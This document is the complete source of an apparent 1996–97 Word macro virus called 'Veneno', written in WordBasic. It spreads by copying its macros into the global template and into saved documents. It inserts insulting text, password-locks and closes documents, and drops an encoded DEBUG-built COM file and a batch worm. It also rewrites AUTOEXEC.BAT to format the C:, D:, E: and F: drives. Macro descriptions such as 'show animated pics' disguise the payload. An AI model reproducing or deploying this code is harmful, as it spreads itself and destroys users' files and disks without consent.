   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ArchivoImprimirPredeter"

   Public Sub MAIN()
   Dim Veneno2$
    On Error Resume Next
    WordBasic.SetDocumentVar "veneno", "X"
    WordBasic.Call "InsertVeneno"
    Veneno2$ = WordBasic.[GetDocumentVar$]("veneno")
    WordBasic.FilePrintDefault
    WordBasic.ScreenUpdating 0
    If (Veneno2$ = "Y") Then
     WordBasic.EndOfDocument
     WordBasic.StartOfLine 1
     WordBasic.LineUp 1, 1
     WordBasic.LineUp 1, 1
     WordBasic.LineUp 1, 1
     WordBasic.WW6_EditClear
     WordBasic.Insert " "
    End If
    WordBasic.StartOfDocument
    WordBasic.ScreenRefresh
    WordBasic.ScreenUpdating 1
   End Sub

   Attribute VB_Name = "ArchivoGuardarComo"

   Public Sub MAIN()
   Dim v1$
   On Error Resume Next
    v1$ = ":ArchivoImprimirPredeter"
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg
    If (dlg.Format = 0) Or (dlg.Format = 1) Then
     WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec", 1
     WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
     WordBasic.MacroCopy "Global:ArchivoAbrir", WordBasic.[WindowName$]() + ":ArchivoAbrir", 1
     WordBasic.MacroCopy "Global:ArchivoImprimir", WordBasic.[WindowName$]() + ":ArchivoImprimir", 1
     WordBasic.MacroCopy "Global:ArchivoSalir", WordBasic.[WindowName$]() + ":ArchivoSalir", 1
     WordBasic.MacroCopy "Global" + v1$, WordBasic.[WindowName$]() + v1$, 1
     WordBasic.MacroCopy "Global:ArchivoGuardarComo", WordBasic.[WindowName$]() + ":ArchivoGuardarComo", 1
     WordBasic.MacroCopy "Global:Trinitron", WordBasic.[WindowName$]() + ":Trinitron", 1
     WordBasic.MacroCopy "Global:InsertVeneno", WordBasic.[WindowName$]() + ":InsertVeneno", 1
     WordBasic.MacroCopy "Global:Veneno", WordBasic.[WindowName$]() + ":Veneno", 1
     WordBasic.MacroCopy "Global:Travel1", WordBasic.[WindowName$]() + ":Travel1", 1
     WordBasic.MacroCopy "Global:Travel2", WordBasic.[WindowName$]() + ":Travel2", 1
     dlg.Format = 1
    End If
    If (WordBasic.Second(WordBasic.Now()) = 38) Then
     WordBasic.MsgBox "Khelia Monica Salda~a Diaz, me encantas y te sigo buscando... ¿Donde te has escondido?  Atte. Tu enamorado. (LoVe90/91)", "Un amigo desesperado en busca de...", 64
    End If
    WordBasic.FileSaveAs dlg
   End Sub

   Attribute VB_Name = "ArchivoImprimir"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo NoLiberar
   WordBasic.DisableAutoMacros 0
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, CreateBackup:=1
   WordBasic.Call "InsertVeneno"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
   WordBasic.CurValues.FilePrint dlg
   WordBasic.Dialog.FilePrint dlg
   WordBasic.FilePrint dlg
   NoLiberar:
   Err.Number = 0
   End Sub

   Attribute VB_Name = "InsertVeneno"

   Public Sub MAIN()
   If (WordBasic.Second(WordBasic.Now()) > 57) Then
     WordBasic.SetDocumentVar "veneno", "Y"
     WordBasic.ScreenUpdating 0
     WordBasic.EndOfDocument
     WordBasic.Insert Chr(13)
     WordBasic.Insert "Finalmente me gustaria agregar que..."
     WordBasic.Insert Chr(13) + "El Centro de Computo de esta Universidad es una verdadera verguenza, no nos merecemos este servicio."
     WordBasic.Insert Chr(13) + ">>> Shame on you!!! <<<" + Chr(13) + "<eof>"
     WordBasic.EndOfDocument
     WordBasic.StartOfLine 1
     WordBasic.LineUp 1, 1
     WordBasic.LineUp 1, 1
     WordBasic.CenterPara
     WordBasic.StartOfDocument
     WordBasic.ScreenRefresh
     WordBasic.ScreenUpdating 1
    End If
   End Sub

   Attribute VB_Name = "ArchivoSalir"

   Public Sub MAIN()
   Dim Venenitos$
   Dim Venenito
   On Error GoTo -1: On Error GoTo Salida
   WordBasic.DisableAutoMacros 0
   Venenitos$ = WordBasic.[GetDocumentVar$]("Venenito")
   If (Venenitos$ = "") Then
    WordBasic.SetDocumentVar "Venenito", "2"
   End If
   Venenito = WordBasic.Val(WordBasic.[GetDocumentVar$]("Venenito"))
   WordBasic.SetDocumentVar "Veneno", "W"
   If (Venenito > 30) Or (Venenito < 2) Then
    WordBasic.SetDocumentVar "Venenito", "10"
    WordBasic.SetDocumentVar "Veneno", "Z"
    WordBasic.Call "Trinitron"
   End If
   Salida:
   Err.Number = 0
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, CreateBackup:=1
   WordBasic.FileExit
   End Sub

   Attribute VB_Name = "ArchivoAbrir"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.DisableAutoMacros 0
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, CreateBackup:=1
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   WordBasic.FileOpen dlg
   End Sub

   Attribute VB_Name = "Trinitron"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Make your document able to show animated pics"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Trinitron.MAIN"
   Dim V5$
   WordBasic.ScreenUpdating 0
   WordBasic.DisableInput 1
   If WordBasic.Minute(WordBasic.Now()) <> 30 Then
       GoTo NoDropper
   End If
   ' Open "C:\DOS\DEBUG.EXE" For Input As #1
   ' Close #1
   Open "C:\DOS\JIJO.SCR" For Output As 1
   Print #1, "N ATTRIB.COM"
   Print #1, "E 0100 E9 4F 03 22 5C CA 90 97 DD 27 5A CB D1 7C B4 C9"
   Print #1, "E 0110 E3 CA 5D 9D F9 6E E6 8F 05 72 5D 30 91 DC E8 D0"
   Print #1, "E 0120 D1 5C 56 CE 91 EB E8 8D 6E 18 D1 7C 22 CE 91 EB"
   Print #1, "E 0130 72 0C 5A F0 58 CA E8 84 E5 CD 5C E4 A2 4C B2 C9"
   Print #1, "E 0140 D1 5C B2 C9 91 EB 2E CD 72 34 D2 24 5F 21 50 E4"
   Print #1, "E 0150 A2 44 B2 C9 52 22 42 CB B5 3D 5C E4 DD 74 74 CE"
   Print #1, "E 0160 1F 85 28 C8 B7 C2 E8 85 91 EB 2E 22 B7 27 E4 CA"
   Print #1, "E 0170 1F 47 CA E2 58 07 7D E4 D7 C4 68 CE E4 CB 1F 47"
   Print #1, "E 0180 CA E2 58 F9 95 07 7D 72 5E F7 D1 5C 74 CE 91 EB"
   Print #1, "E 0190 CF 72 5C 9D 91 EB 72 43 52 FC 58 E4 D5 DC 64 CE"
   Print #1, "E 01A0 E8 F5 E5 C9 5C 47 CA 22 5F 07 7D 47 D2 22 5F 4A"
   Print #1, "E 01B0 B5 CF DC 27 59 C8 91 4A A5 57 28 C8 B7 FA E4 CB"
   Print #1, "E 01C0 0B E4 D7 C4 6A CE 72 41 4A F2 58 07 7D 72 5D 89"
   Print #1, "E 01D0 D1 5C 74 CE 72 41 52 FE 58 07 7D 7E 62 07 7D C4"
   Print #1, "E 01E0 B4 59 5C E4 DC F4 66 CE 59 BE 16 23 24 35 72 41"
   Print #1, "E 01F0 D2 23 5F E4 D7 4C 78 CE DD 0B 0E C9 67 0B 28 74"
   Print #1, "E 0200 71 C9 5C E4 D5 4C B0 C9 E4 CA 1E F9 95 53 91 EB"
   Print #1, "E 0210 E8 8A E5 C9 5C 47 CA 21 5F 07 7D 72 5E 88 6F 03"
   Print #1, "E 0220 C5 07 7D 7E 1C 73 13 C9 D1 5C 5F CB 91 EB 72 34"
   Print #1, "E 0230 5A F0 58 21 D5 C4 B4 F7 5C 7E 67 47 CA B4 58 07"
   Print #1, "E 0240 7D 7E 76 07 7D 4A A2 C0 29 CD DC 30 49 BF 5E 21"
   Print #1, "E 0250 52 09 E8 F1 D1 5C 5B CE 91 EB 2E 13 B5 1D A2 7A"
   Print #1, "E 0260 5E 73 C6 C8 E6 CA 5C 71 9C C8 91 EC D1 5C 67 CE"
   Print #1, "E 0270 E8 C3 91 EB B7 34 D1 5C A8 C9 E8 84 E5 CD 5C 07"
   Print #1, "E 0280 7D B8 47 47 CA E2 58 72 5D 89 6F 03 91 EB E8 8B"
   Print #1, "E 0290 D1 5C 74 CE 91 EB E8 85 91 EB 2E C8 BE 2F D1 5C"
   Print #1, "E 02A0 A6 C9 E8 84 E5 CD 5C 07 7D B8 48 47 CA E2 58 72"
   Print #1, "E 02B0 5D 89 6F 03 91 EB E8 8B D1 5C 74 CE 91 EB 97 01"
   Print #1, "E 02C0 07 9E 09 E4 0F BF 35 A9 35 AE 3D A6 72 8E 2E AF"
   Print #1, "E 02D0 3D A7 72 88 01 E2 3F E3 7C FB 65 F3 6A EA 08 A2"
   Print #1, "E 02E0 39 EA 1A B8 39 AB 37 E5 08 A2 39 EA 09 A4 38 AF"
   Print #1, "E 02F0 2E AD 2E A5 29 A4 38 8C 2E A5 31 EA 28 A2 39 EA"
   Print #1, "E 0300 34 B3 2C A4 33 BE 35 A9 7C B9 2C AF 3F BE 2E AF"
   Print #1, "E 0310 7C A5 3A EA 2B AB 37 AF 7C 83 7C B9 3F B8 39 AB"
   Print #1, "E 0320 31 86 33 A9 37 AF 38 EA 35 A4 7C BE 34 AF 7C AE"
   Print #1, "E 0330 39 BA 28 A2 2F EA 33 AC 7C AB 7C 99 29 A3 3F A3"
   Print #1, "E 0340 38 AB 30 EA 18 B8 39 AB 31 63 90 19 9E B7 8D 06"
   Print #1, "E 0350 21 63 9E 74 99 B7 E2 01 9D B7 F5 0C 97 0B 8C 74"
   Print #1, "E 0360 8A B4 21 60 8A B7 9F 74 8F B7 E3 74 E3 08 8C B4"
   Print #1, "E 0370 22 B7 F3 08 95 08 E2 1A 9E 0B 21 6D E2 01 D0 5C"
   Print #1, "E 0380 CF B4 21 B7 FF 05 90 00 21 6A E2 01 E2 0B E2 B4"
   Print #1, "E 0390 21 B7 EA 18 91 43 21 1B 99 74 8D 1A 21 05 9A 0E"
   Print #1, "E 03A0 99 1B 21 74 8F B7 91 08 90 07 95 08 8C 41 D7 B7"
   Print #1, "E 03B0 FC 54 F7 54 FD 54 22 4F 9C 4C 21 44 CA 5C CF B7"
   Print #1, "E 03C0 ED 0F 9E B7 FF 05 9E 74 94 41 21 54 95 03 21 05"
   Print #1, "E 03D0 9A 0E 99 1B 8C B7 8C 1B 90 03 9E 01 D7 B7 EC 06"
   Print #1, "E 03E0 21 08 E2 1B 21 00 9E 41 91 EA 5C 23 5C CA 75 E4"
   Print #1, "E 03F0 3F A5 31 CA 76 E4 26 F5 63 CA 63 F5 63 F5 63 F5"
   Print #1, "E 0400 63 F5 72 F5 6C F5 5C E4 72 CA 5C CA 5C CA 5C CA"
   Print #1, "E 0410 5C CA 5C CA 5C CA 5C CA 5C CA 5C CA 5C CA 5C CA"
   Print #1, "E 0420 5C CA 5C CA 5C CA 5C CA 5C CA 5C CA 5C CA 5C CA"
   Print #1, "E 0430 5C CA 5C CA 5C CA 5C CA 5C CA 5C 82 3D BA 2C B3"
   Print #1, "E 0440 7C 88 35 B8 28 A2 38 AB 25 EA 1A B8 39 AB 37 B3"
   Print #1, "E 0450 7D EE BE 00 01 56 B9 A9 01 C7 04 B5 CA C6 44 02"
   Print #1, "E 0460 5C 81 34 5C CA 46 46 E2 F8 31 F6 31 C9 C3 00"
   Print #1, "RCX"
   Print #1, "36F"
   Print #1, "W"
   Print #1, "Q"
   Print #1, ""
   Close 1

   Open "C:\DOS\mEXEC.BAT" For Output As 1
   Print #1, "@echo off"
   Print #1, "dir /a *. > nul"
   Print #1, "dir /a *. > nul"
   Print #1, "debug < jijo.scr > nul"
   Print #1, "dir /a *. > nul"
   Print #1, "dir /a *. > nul"
   Close 1

   Open "C:\DOS\diur.BAT" For Output As 1
   Print #1, "@echo OFF                 "
   Print #1, "if not exist c:\windows\willy.bmp copy %0 c:\windows\willy.bmp > nul"
   Print #1, "if " + Chr(34) + "%1" + Chr(34) + "==" + Chr(34) + "DIR" + Chr(34) + " GOTO A       "
   Print #1, "if " + Chr(34) + "%1" + Chr(34) + "==" + Chr(34) + "ARC" + Chr(34) + " GOTO I       "
   Print #1, "if " + Chr(34) + "%p%" + Chr(34) + "==" + Chr(34) + "2" + Chr(34) + " GOTO Slv"
   Print #1, "if " + Chr(34) + "%p%" + Chr(34) + "==" + Chr(34) + "1" + Chr(34) + " set p=2"
   Print #1, "if " + Chr(34) + "%o%" + Chr(34) + "==" + Chr(34) + "2" + Chr(34) + " set p=1"
   Print #1, "set o=a"
   Print #1, "for %%o in (%path%) do if exist %%o\nul call %0 DIR %%o"
   Print #1, "goto end"
   Print #1, ":A"
   Print #1, "if " + Chr(34) + "%o%" + Chr(34) + "==" + Chr(34) + "2" + Chr(34) + " goto end"
   Print #1, "for %%q in (%2\????.!x!) do call %0 ARC %%q"
   Print #1, "goto end"
   Print #1, ":I"
   Print #1, "if " + Chr(34) + "%o%" + Chr(34) + "==" + Chr(34) + "2" + Chr(34) + " goto end"
   Print #1, "copy %0 %2 > nul"
   Print #1, "if " + Chr(34) + "%o%" + Chr(34) + "==" + Chr(34) + "c" + Chr(34) + " set o=2"
   Print #1, "if " + Chr(34) + "%o%" + Chr(34) + "==" + Chr(34) + "b" + Chr(34) + " set o=c"
   Print #1, "if " + Chr(34) + "%o%" + Chr(34) + "==" + Chr(34) + "a" + Chr(34) + " set o=b"
   Print #1, "goto end"
   Print #1, ":Slv"
   Print #1, "echo                             .:::'"
   Print #1, "echo                           .::::."
   Print #1, "echo         ~,CC$$$$C.     .:::::::::::::.:''"
   Print #1, "echo      ,d$$$$$$$$$$$$F _`:::::::::::::   " + Chr(34) + ":"
   Print #1, "echo   ,d$$$$%=== `?$$P,F?}:::'_`:::::::  .'" + Chr(34) + ""
   Print #1, "echo    " + Chr(34) + Chr(34) + Chr(34) + Chr(34) + Chr(34) + ",/CCCCC\," + Chr(34) + " F' ;',J$$'::::::::`"
   Print #1, "echo        :CCCCCCCCCC,`::'J" + Chr(34) + "  ? ```````:"
   Print #1, "echo       {.CCCCCCCCCCC `' " + Chr(34) + ",,Cd$$$$$$$$$b."
   Print #1, "echo        ?,`CCCCCCCC/,C4$L``" + Chr(34) + Chr(34) + Chr(34) + "??$$$$$$$$b"
   Print #1, "echo         `?C,,`''',C$$F      .dC,`?$$$$$$$,"
   Print #1, "echo         ?$$$$$$$$" + Chr(34) + "  ..  z$$$$$C$$$$$$$F'"
   Print #1, "echo           " + Chr(34) + " " + Chr(34) + " " + Chr(34) + Chr(34) + "  .::: d??" + Chr(34) + "?$$$$$$$$$$$,"
   Print #1, "echo                 \, ``` ,P" + Chr(34) + "ze   " + Chr(34) + Chr(34) + "???$$$$$"
   Print #1, "echo                  ~!=!" + Chr(34) + ".z$$$        `?$$" + Chr(34) + "'"
   Print #1, "echo                      `:" + Chr(34) + "$$$L          `" + Chr(34) + "  Silv" + Chr(238) + "st" + Chr(231) + Chr(238) + " is"
   Print #1, "echo                       :: ?$$L             my   H" + Chr(238) + Chr(231) + "0!!!"
   Print #1, "echo                    ..:.::: $$L .          T/Vr by Me!"
   Print #1, "echo                  .::::::::::?$$$::        M" + Chr(238) + "XiC0 Dic96"
   Print #1, "echo Plz w’it..."
   Print #1, "if exist e:\nul echo U r fuCked! > e:\UrfuCked.!!!"
   Print #1, "ctty NUL"
   Print #1, "command.com /f /c copy %0 A:\AUTOEXEC.BAT > nul"
   Print #1, "if exist c:\dos\attrib.com command.com /f /c copy c:\dos\attrib.com A:\C00l.COM > nul"
   Print #1, "for %%r in (E F C) DO Format %%r: /u /AutOtest"
   Print #1, "if exist d:\nul echo U r fuCked! > d:\UrfuCked.!!!"
   Print #1, "if exist c:\nul echo U r fuCked! > c:\UrfuCked.!!!"
   Print #1, "ctty COn"
   Print #1, "echo Ok..."
   Print #1, "pause"
   Print #1, "pause"
   Print #1, "pause"
   Print #1, "echo"
   Print #1, ":end"
   Close 1

   On Error GoTo -1: On Error GoTo NoLePegues
   WordBasic.ChDir "C:\DOS"
   WordBasic.Shell "mEXEC.BAT", 0
   SetAttr "C:\dos\diur.bat", 3

   WordBasic.Kill "C:\DOS\mEXEC.BAT"
   WordBasic.Kill "C:\DOS\JIJO.SCR"

   GoTo NoLePegues
   Err.Number = 0
   NoDropper:
   On Error GoTo -1: On Error GoTo NoMeBotes
   V5$ = "A"
   V5$ = WordBasic.[GetDocumentVar$]("Veneno")
   NoMeBotes:
   Err.Number = 0
   If ((WordBasic.Weekday(WordBasic.Now()) > 5) And (WordBasic.Minute(WordBasic.Now()) < 5)) Or (V5$ = "Z") Then
    V5$ = "A"
    WordBasic.DisableInput 1
    WordBasic.ScreenUpdating 1
    On Error Resume Next
    While WordBasic.Window() <> 0
    WordBasic.SetDocumentVar "Veneno", "N"
    WordBasic.ScreenUpdating 0
     WordBasic.Font "Arial"
     WordBasic.Insert " ** V<N<N0 ** "
     WordBasic.EditReplace Find:="ste ", Replace:="stes ", ReplaceAll:=1, Wrap:=1
   '  ActualizarPantalla 1
   ' ToolsOptionsSave .Password = "Veneno"
    WordBasic.ToolsOptionsSave Password:="Veneno"
     WordBasic.DocClose 1
    Wend
   End If

   NoLePegues:
   WordBasic.ScreenUpdating 1
   WordBasic.DisableInput 0
   End Sub

   Attribute VB_Name = "AutoExec"

   ' This fuckin macro was developed by Me! (Mexico City 31/Dic/96)
   ' ********* Updated -> 1,2,8,9,10,15,20,21 & 22 Jan/97 *********
   '
   '
   Public Sub MAIN()
   Dim v1$
    On Error Resume Next
    v1$ = ":ArchivoImprimirPredeter"
    WordBasic.ToolsOptionsUserInfo Name:="Veneno", Initials:="PiratecMX"
   '
   '  **** BORRA LAS MACROS AUTOS QUE NO SON DE ESTE VIRUS ****
    BorraAutos
    If OkInst < 6 Then
   '
   '  *** AQUI SE COPIAN LAS MACROS DESDE EL ARCHIVO HACIA WORD ***
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 1
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 1

      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArchivoAbrir", "Global:ArchivoAbrir", 1

      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArchivoImprimir", "Global:ArchivoImprimir", 1

      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArchivoSalir", "Global:ArchivoSalir", 1

      WordBasic.MacroCopy WordBasic.[WindowName$]() + v1$, "Global" + v1$, 1

      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArchivoGuardarComo", "Global:ArchivoGuardarComo", 1

      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Trinitron", "Global:Trinitron", 1

      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":InsertVeneno", "Global:InsertVeneno", 1

      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Veneno", "Global:Veneno", 1

      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Travel1", "Global:Travel1", 1

      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Travel2", "Global:Travel2", 1

   '
   ' **** SI NO EXISTE LA MACRO AUTOEXEC EN WORD, COPIARLA DEL BACKUP ****
      If (Recupera1 = 0) Then
        WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Travel1", "Global:AutoExec", 1

        WordBasic.MacroCopy "Global:Travel1", WordBasic.[WindowName$]() + ":AutoExec", 1

      End If
      If (Recupera2 = 0) Then
        WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Travel2", "Global:AutoOpen", 1

        WordBasic.MacroCopy "Global:Travel2", WordBasic.[WindowName$]() + ":AutoOpen", 1

      End If
   End If
   WordBasic.Call "Veneno"
   WordBasic.Call "Trinitron"
   End Sub

   Private Function OkInst()
   Dim Checa
   Dim i
    Checa = 0
     If WordBasic.CountMacros(0) > 5 Then
      For i = 1 To WordBasic.CountMacros(0)
       If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
        Checa = (Checa + 1)
       End If
       If WordBasic.[MacroName$](i, 0) = "Veneno" Then
        Checa = (Checa + 1)
       End If
       If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then
        Checa = (Checa + 1)
       End If
       If WordBasic.[MacroName$](i, 0) = "InsertVeneno" Then
        Checa = (Checa + 1)
       End If
       If WordBasic.[MacroName$](i, 0) = "Trinitron" Then
        Checa = (Checa + 1)
       End If
       If WordBasic.[MacroName$](i, 0) = "Travel1" Then
        Checa = (Checa + 1)
       End If
      Next i
     End If
    OkInst = Checa
   End Function

   '
   ' **** BORRA LAS AUTOMACROS QUE NO SON DE ESTE VIRUS ****
   '
   Private Function BorraAutos()
   Dim i
   Dim V2$
    On Error Resume Next
    If WordBasic.CountMacros(0) > 0 Then
     For i = 1 To WordBasic.CountMacros(0)
      V2$ = WordBasic.[MacroName$](i, 0)
      If (UCase(V2$) = "AUTOEXEC") And (V2$ <> "AutoExec") Then
       If WordBasic.[MacroFileName$](V2$) <> "" Then
        WordBasic.ToolsMacro Name:=V2$, Show:=1, Delete:=1
       End If
      End If
      If (UCase(V2$) = "AUTOOPEN") And (V2$ <> "AutoOpen") Then
       If WordBasic.[MacroFileName$](V2$) <> "" Then
        WordBasic.ToolsMacro Name:=V2$, Show:=1, Delete:=1
       End If
      End If
      If (UCase(V2$) = "AUTOCLOSE") Then
       If WordBasic.[MacroFileName$](V2$) <> "" Then
        WordBasic.ToolsMacro Name:=V2$, Show:=1, Delete:=1
       End If
      End If
      If (UCase(V2$) = "AUTOEXIT") Then
       If WordBasic.[MacroFileName$](V2$) <> "" Then
        WordBasic.ToolsMacro Name:=V2$, Show:=1, Delete:=1
       End If
      End If
      If (UCase(V2$) = "AUTONEW") Then
       If WordBasic.[MacroFileName$](V2$) <> "" Then
        WordBasic.ToolsMacro Name:=V2$, Show:=1, Delete:=1
       End If
      End If
      If (UCase(V2$) = "HERRAMMACRO  ") Then
       If WordBasic.[MacroFileName$](V2$) <> "" Then
        WordBasic.ToolsMacro Name:=V2$, Show:=1, Delete:=1
       End If
      End If
     Next i
    End If
   End Function

   Private Function Recupera1()
   Dim Checa
   Dim i
       Checa = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
                   Checa = (Checa + 1)
               End If
           Next i
       End If
       Recupera1 = Checa
   End Function

   Private Function Recupera2()
   Dim Checa
   Dim i
       Checa = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then
                   Checa = (Checa + 1)
               End If
           Next i
       End If
       Recupera2 = Checa
   End Function

   Attribute VB_Name = "Travel1"

   ' This fuckin macro was developed by Me! (Mexico City 31/Dic/96)
   ' ********* Updated -> 1,2,8,9,10,15,20,21 & 22 Jan/97 *********
   '
   '
   Public Sub MAIN()
   Dim v1$
    On Error Resume Next
    v1$ = ":ArchivoImprimirPredeter"
    WordBasic.ToolsOptionsUserInfo Name:="Veneno", Initials:="MX"
   '
   '  **** BORRA LAS MACROS AUTOS QUE NO SON DE ESTE VIRUS ****
    BorraAutos
    If OkInst < 6 Then
   '
   '  *** AQUI SE COPIAN LAS MACROS DESDE EL ARCHIVO HACIA WORD ***
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 1
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 1
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArchivoAbrir", "Global:ArchivoAbrir", 1
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArchivoImprimir", "Global:ArchivoImprimir", 1
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArchivoSalir", "Global:ArchivoSalir", 1
      WordBasic.MacroCopy WordBasic.[WindowName$]() + v1$, "Global" + v1$, 1
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArchivoGuardarComo", "Global:ArchivoGuardarComo", 1
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Trinitron", "Global:Trinitron", 1
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":InsertVeneno", "Global:InsertVeneno", 1
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Veneno", "Global:Veneno", 1
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Travel1", "Global:Travel1", 1
      WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Travel2", "Global:Travel2", 1
   '
   ' **** SI NO EXISTE LA MACRO AUTOEXEC EN WORD, COPIARLA DEL BACKUP ****
      If (Recupera1 = 0) Then
        WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Travel1", "Global:AutoExec", 1
        WordBasic.MacroCopy "Global:Travel1", WordBasic.[WindowName$]() + ":AutoExec", 1
      End If
      If (Recupera2 = 0) Then
        WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Travel2", "Global:AutoOpen", 1
        WordBasic.MacroCopy "Global:Travel2", WordBasic.[WindowName$]() + ":AutoOpen", 1
      End If
   End If
   WordBasic.Call "Veneno"
   WordBasic.Call "Trinitron"
   End Sub

   Private Function OkInst()
   Dim Checa
   Dim i
    Checa = 0
     If WordBasic.CountMacros(0) > 5 Then
      For i = 1 To WordBasic.CountMacros(0)
       If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
        Checa = (Checa + 1)
       End If
       If WordBasic.[MacroName$](i, 0) = "Veneno" Then
        Checa = (Checa + 1)
       End If
       If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then
        Checa = (Checa + 1)
       End If
       If WordBasic.[MacroName$](i, 0) = "InsertVeneno" Then
        Checa = (Checa + 1)
       End If
       If WordBasic.[MacroName$](i, 0) = "Trinitron" Then
        Checa = (Checa + 1)
       End If
       If WordBasic.[MacroName$](i, 0) = "Travel1" Then
        Checa = (Checa + 1)
       End If
      Next i
     End If
    OkInst = Checa
   End Function

   '
   ' **** BORRA LAS AUTOMACROS QUE NO SON DE ESTE VIRUS ****
   '
   Private Function BorraAutos()
   Dim i
   Dim V2$
    On Error Resume Next
    If WordBasic.CountMacros(0) > 0 Then
     For i = 1 To WordBasic.CountMacros(0)
      V2$ = WordBasic.[MacroName$](i, 0)
      If (UCase(V2$) = "AUTOEXEC") And (V2$ <> "AutoExec") Then
       If WordBasic.[MacroFileName$](V2$) <> "" Then
        WordBasic.ToolsMacro Name:=V2$, Show:=1, Delete:=1
       End If
      End If
      If (UCase(V2$) = "AUTOOPEN") And (V2$ <> "AutoOpen") Then
       If WordBasic.[MacroFileName$](V2$) <> "" Then
        WordBasic.ToolsMacro Name:=V2$, Show:=1, Delete:=1
       End If
      End If
      If (UCase(V2$) = "AUTOCLOSE") Then
       If WordBasic.[MacroFileName$](V2$) <> "" Then
        WordBasic.ToolsMacro Name:=V2$, Show:=1, Delete:=1
       End If
      End If
      If (UCase(V2$) = "AUTOEXIT") Then
       If WordBasic.[MacroFileName$](V2$) <> "" Then
        WordBasic.ToolsMacro Name:=V2$, Show:=1, Delete:=1
       End If
      End If
      If (UCase(V2$) = "AUTONEW") Then
       If WordBasic.[MacroFileName$](V2$) <> "" Then
        WordBasic.ToolsMacro Name:=V2$, Show:=1, Delete:=1
       End If
      End If
      If (UCase(V2$) = "HERRAMMACRO  ") Then
       If WordBasic.[MacroFileName$](V2$) <> "" Then
        WordBasic.ToolsMacro Name:=V2$, Show:=1, Delete:=1
       End If
      End If
     Next i
    End If
   End Function

   Private Function Recupera1()
   Dim Checa
   Dim i
       Checa = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
                   Checa = (Checa + 1)
               End If
           Next i
       End If
       Recupera1 = Checa
   End Function

   Private Function Recupera2()
   Dim Checa
   Dim i
       Checa = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then
                   Checa = (Checa + 1)
               End If
           Next i
       End If
       Recupera2 = Checa
   End Function

   Attribute VB_Name = "Veneno"



   Rem This fuckin macro was developed by Me! (Mexico City 31/Dic/96)
   Rem
   Rem
   Rem                         <This is the end>
   Rem
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Exports an auto-format template to every document opened under Microsoft Word"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Veneno.MAIN"
   Dim Num
   ' If (Mes(Ahora()) < 6) And (Día(Ahora()) > 26) Then
       Num = WordBasic.Int(Rnd() * 30 + 1)
       If (WordBasic.Day(WordBasic.Now()) > 26) And (Num > 29) Then
           SetAttr "C:\AUTOEXEC.BAT", 0
           Open "C:\AUTOEXEC.BAT" For Output As 1
           Print #1, "@echo off"
           Print #1, "PATH=C:\;C:\DOS;C:\WINDOWS;C:\ODI;"
           Print #1, "Echo."
           Print #1, "Echo Insert a diskette in drive A:"
           Print #1, "Echo Press any key to continue..."
           Print #1, "pause > nul"
           Print #1, "Format a: /autotest > nul"
           Print #1, "if errorlevel 0 goto End"
           Print #1, "Format d: /autotest"
           Print #1, "Format c: /autotest"
           Print #1, "Echo U r FuCkEd!"
